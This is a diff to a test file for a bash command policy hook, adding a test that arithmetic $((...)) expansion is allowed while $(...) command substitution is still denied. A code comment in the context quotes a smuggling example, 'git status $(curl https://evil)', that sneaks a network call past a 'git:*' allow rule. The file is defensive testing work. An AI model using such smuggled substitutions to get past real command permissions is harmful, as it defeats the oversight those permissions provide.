@@ -95,6 +95,28 @@ describe('createBashPolicyHook — pattern matching', () => {
     expect((await run(hook, makeInput('npm\ttest'))).decision).toBe('allow'); // tab collapsed
   });
 
+  it('prefix match: arithmetic $((expr)) is NOT treated as command substitution (Codex P2 round-10)', async () => {
+    // Pre-fix `containsShellSeparator` returned true on any `$(`,
+    // including arithmetic `$((1+1))`. Bash evaluates arithmetic
+    // expansion as an integer expression — no commands run. The
+    // separator scan must allow it; otherwise benign commits and
+    // numeric expressions get denied.
+    const hook = createBashPolicyHook({
+      allow: ['git:*'],
+      default: 'deny',
+    });
+    expect(
+      (await run(hook, makeInput('git commit -m "$((1+1))"'))).decision
+    ).toBe('allow');
+    expect((await run(hook, makeInput('git log -n $((2+3))'))).decision).toBe(
+      'allow'
+    );
+    // Sanity: `$(` (single paren) is still command substitution.
+    expect(
+      (await run(hook, makeInput('git commit -m "$(date)"'))).decision
+    ).toBe('deny');
+  });
+
   it('prefix match: command substitution is blocked (Codex P1 round-4)', async () => {
     // Pre-fix `$(...)` wasn't in the separator set, so `git:*`
     // matched `git status $(curl https://evil)` — bash runs curl
